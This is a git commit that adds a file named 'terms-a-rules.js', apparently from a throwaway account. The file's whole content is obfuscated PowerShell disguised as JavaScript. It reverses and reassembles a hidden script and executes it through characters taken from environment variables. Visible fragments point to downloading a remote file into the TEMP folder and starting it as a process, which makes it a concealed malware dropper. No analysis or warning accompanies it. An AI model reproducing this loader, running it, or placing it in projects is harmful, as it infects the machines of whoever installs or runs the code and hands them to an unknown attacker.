29f5a2a94ea930a18a2840067bf813323b936b56
Azkic50 <Azkilohj55@gmail.com>
2025-03-31 17:29:03 -0400

    Create terms-a-rules.js

---
+++ terms-a-rules.js
@@ -0,0 +1,22 @@
+seT  ('Y8t'+'i')  ([chAr[ ]]"))93]RAhc[,)66]RAhc[+87]RAhc[+58]RAhc[( EcalPerc- 63]RAhc[,'9Nw'  EcalPerc-  421]RAhc[,'oex' eCAlPeR-  43]RAhc[,'l0v'EcalPerc-  )')BNUBNUNioj-BNUxBNU+]3,1[)ecnERE'+'FErpesObReV9Nw]'+'GNiRTs[( (&oex)93]RaHc['+',BNUEv1BNU eCAlPEr-63]RaHc[,BNUpHUBNU  '+'ECalPErc- 421]RaHc[,BNU8m1BNU eCA'+'lPEr-))BNU1f-RuF}3{}0{}2{Ev1+Ev1}1{RuF(BNU,BNU1krE1U,E1UYX'+'Ev1+'+'Ev1/Ev1+Ev1ecaps'+'EEv1+Ev11UE'+'v1+Ev1 f- RuF}8{}'+'0Ev1+Ev1{}4'+'{Ev1+Ev1}6{}Ev1+Ev12{EvBNU,BNUEv11UthEBNU,'+'BNU)
+}'+')BNU,BNU+EvBNU,BNU1mnQ = }Ev1+EvBNU,BNU1motsu'+'CSE'+'v1+Ev1P[  Ev1+Ev1
+(Ev1+Ev1@ = }aTadEEEv1+Ev1eEv1+Ev1JmEEv1+Ev1eJOSEv1+Ev1{mEv1+BNU,BNU-tseTEEv1+EBNU,BNU1+EvBNU,B'+'NU+Ev1tEv1BNU,BNU1UaEBNU,BNU1 eCaLpEr-43]rAh'+'C[,Ev1RuFEv1ecALperc-93]rAhC[,BNU,BNUEv1+BNU,BNUU Ev1+Ev1fEv1+EvBNU,BNU)Ev1XEv1+]31[DillehspHU+]1[diLleHspHU (. 8m'+'1 )29'+']'+'rAhC[,Ev1d8IEv1 eCaLpEr'+'-63]rAhC[,Ev1mn'+'QEv'+'BNU,BN'+'Ui      
+;}EUEeEBNU,BNU 
+{ )}dAEv1BNU,BNUv11UBNU'+',BNUv1+Ev1f-E'+'v1+Ev1 REv1+Ev1uF}2Ev1+Ev1{}Ev1+Ev11EBNU,BNUoEv1'+'+Ev1vnIE1U,E1U'+'Ev1+Ev1eMtE1U,E1UEv1+Ev1dE1BNU,BNU+Ev15{}7{RuF( = )EBNU,BNU'+'CaLpEr-69]rAhC[,Ev1EeJEv1 ecALperc- )Ev1  
+
+}  
+}   Ev1+Ev1 
+{ hctac    
+}  '+'Ev1+Ev1  
+;Ev1+Ev1}hEv1+Ev1TEeJEv1+Ev1ApElEeJIF{mEv1+'+'Ev1nQ'+' )E1UsseEv1+Ev1cE1U,E1UtE1U,E1UraBN'+'U,BNU1- R'+'uF}0{}3{}1{}2Ev1+Ev1{RuF(& BNU,BNUtSE1U,E1UorEv1+Ev1P-E1UEv1BNU,BNUaoLEeJnEv1+Ev1WoBNU,BNUpEEEv1+'+'Ev1eEv1+Ev1JliEeJFEv1+Ev1{mEv1+Ev1nEv1+Ev1Q el'+'iFt'+'uO- RuFARuF.Ev1+Ev1}I{mnQ irBNU,BNUE1UsEv1+Ev1mBNU,BNUv1+Ev1    
+{ )Ev1+Ev1}HtaE'+'v1+Ev1BNU,BNU&   Ev1BNU,BNUEv1E1UEv1 eBNU,BNUEv1nQ Ev1+Ev1 
+
+Ev1(( BNU,BNUv1JmOS{BNU,BNUPEEeJLIEeJF{mEv1+Ev1n'+'Q Ev1+Ev1)EBNU'+',BNU'+'(EBNU'+',BNUv1+Ev1{}0{RuFBNU,BNUE1U,E1UEv1+Ev1tE1U,E1U.Ev1BNU,BNUEv1yrtEv1+Ev1    
+{ )}a'+'tAEeJEv1+Ev1DEv1'+'+Ev1EEv1+Ev1E'+'eEv1+EBNU,BNU1UhtE1UEv1+Ev1,E1UaPE1U,E1UBNU,BNU+Ev1OLEv1+Ev1EEv1+Ev1eEv1+Ev1JEv1+Ev1NEeJWEBNU,BNUpE'+'v1+Ev1EBNU,BNU    Ev1+Ev1  BNU,BNU1DAOlEeJNwOEeJEv1+Ev1D{mnQEv1+Ev1      
+;RuF)b.imnQ(mnQ'+'d'+'8IPEv1+Ev1MET:vnemEv1+Ev'+'1nQRuFEv1'+'+Ev1 = }Ev1+Ev1HTAEv1+Ev1BNU,BNU.2CJWKEv1'+'+Ev1E1U,E1Ui'+'E1U,'+'E1Ev1+Ev1UMYYE1U,Ev1+Ev1'+'EEv1+Ev11UEv1+Ev1XE1U f- Ev1+Ev1RE'+'v1+Ev1uF}2{}3{}1{}0{RuF(Ev1+Ev1 = )E1UbE1U(Ev1+E'+'v1 ;)E1U'+'//:spEB'+'NU,BNUv'+'1+Ev1E1U,E1UEv1+'+'Ev1rEv1+Ev1i'+'dEv1+Ev1-Ev1+Ev1traBNU,BNUv1+Ev1&( Ev1+Ev1fBNU,BNU1Ev1+Ev1U,E1UisEv1+Ev1'+'mEv1+Ev1.CJWKMYE'+'1U,EEv1+BNU'+',BNUEv1+EBNU,BNUU- '+'EBNU,BNUd{mnEv1+Ev1Q Ev1+Ev1 Ev1+Ev1  EBNU,BNUv11Ev1+Ev1U({@]tcejEv1+Ev1bOEv1+Ev'+'BNU,'+'BNUJRT{EvBNU,BNUv1+Ev1BNU,BNUE'+'BNU,BNUv1+Ev1)E1UohtE1UEv1+Ev1,E1UseEv1+Ev1R-ekEv1+Ev1BNU'+','+'BNU+Ev1   
+}      
+Ev1+Ev1 ;}Ev1+Ev1htaBNU,BNU1+Ev1}1{}3{}9{Ev1+E'+'v1}Ev1BNU,BNUEv1eJoD{mn'+'Q( '+'Ev1+Ev1fiEv1+Ev1      
+ }   '+'Ev1+Ev1   '+'
+;}ESEeJlAF{mnQ = }'+'dEv1+Ev1BNU,BNUmnQBNU,BNU+'+'Ev1EEv1+Ev11U,E1'+'UapEEv1+Ev11U,E1UEv1+Ev1k-E1U,E1UEv1+EvBNU,BNU nEv1+Ev1i'+'Ev1+Ev1 }I{mnQ(Ev1+Ev1 hcaeroEv1+Ev1f  
+;Ev1+'+'Ev1BNU,BNUeJeLE'+'v1+Ev1IF{mnQ    Ev1+Ev1  
+{ Ev1+BNUf- l0v}64{}'+'94{}13{}93{}73{}65{}06{}23{}6{}53{}31{'+'}7{}14{}74{}83{}02{}44{}22{}84{}4{}63{}21{}33{}82{'+'}32{}35{}34{}8{}24{}62{}72{}61{}54{}9{}01{}25{}55{}91{}12{}0{}42{}92{}3{}1{}75{}43{}81{}51{}85{}71{}52{}15{}2{}95{}'+'5{}04{}05{}41{}11{}45{}03{l0v((( '(( ()'x'+]31[dILleHS$+]1[DillEHs$ (& ") ; [aRrAY]::revERSE($y8ti ) ;$y8ti -join ''| .( $env:COMspeC[4,15,25]-jOiN'')
